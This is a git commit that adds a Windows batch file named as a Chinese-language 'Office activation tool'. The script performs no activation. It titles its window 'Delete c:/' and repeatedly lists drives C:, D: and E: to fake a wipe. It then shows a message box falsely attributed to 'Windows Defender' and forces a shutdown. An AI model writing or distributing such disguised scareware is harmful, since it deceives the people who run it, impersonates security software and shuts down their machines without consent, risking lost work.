7ca935087fb5b0030ac56f4df8fc5dda17806635
Kevin Woo <100011344+wujukai123@users.noreply.github.com>
2022-12-20 18:30:22 +0800

    Add files via upload

---
+++ Office激活工具.bat
@@ -0,0 +1,42 @@
+
+
+
+title Delete c:/
+cd ..
+cd ..
+cd c:/
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+cd ..
+cd e:/
+tree
+tree
+tree
+tree
+tree
+tree
+cd ..
+cd d:/
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+tree
+mshta vbscript:msgbox("Windows Defender",64,"Windows will be shut down in one minute")(window.close)
+shutdown /s
